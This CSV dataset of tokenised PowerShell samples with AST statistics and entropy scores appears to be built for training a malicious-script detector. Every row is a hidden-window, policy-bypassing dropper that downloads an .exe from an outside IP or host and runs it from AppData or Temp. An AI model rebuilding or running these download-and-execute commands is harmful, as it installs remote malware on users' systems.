new_parameters,source_code,ast,node_type_statistics,ast_deep,ast_total,ast_width,entropy,label
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 58 30 trevor winx64 exe env appdata winx64 exe start process env appdata winx64 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025830trevorwinx64exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.74197,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 93 174 94 137 rama jusch exe env temp jusch exe start process env temp jusch exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden juschedexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9317494137ramajuschedexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess juschedexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.22901,0
window hidden enc,new object system net webclient downloadfil http 94 102 58 30 trevor winx64 exe env appdata winx64 exe start process env appdata winx64 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025830trevorwinx64exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.74197,0
executionpolicy bypass windowstyle hidden enc,new object system net webclient downloadfil http hnng moe f inx env temp microsoft exe start process env temp microsoft exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httphnngmoefInX ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.67182,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
ExecutionPolicy bypass noprofile windowstyle hidden Enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 93 174 94 135 kali ketti exe env appdata profilest exe start process env appdata profilest exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden profilestexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9317494135kalikettyexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess profilestexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.19245,0
ep bypass noni w hidden enc,new object system net webclient downloadfil http brokelimit wp admin css upload ken1 exe mess exe start process mess exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpbrokelimitedsinwpadmincssuploadken1exe messexe ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess messexe ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 7 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,19,11,6.62049,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,powershel executionpolici bypass noprofil windowstyl hidden command new object system net webclient downloadfil http 93 174 94 137 rama jusch exe env temp jusch exe start process env temp jusch exe, UsingStatements null NamedBlockAst Statements CommandAst CommandElements StringConstantExpressionAst Powershell bypass hidden juschedexe CommandParameterAst null null null null InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9317494137ramajuschedexe VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandElements StringConstantExpressionAst StartProcess juschedexe VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandAst 3 CommandElements 3 StringConstantExpressionAst 10 CommandParameterAst 4 InvokeMemberExpressionAst 1 Arguments 1 VariableExpressionAst 2 ParenExpressionAst 1,9,29,12,7.22901,0
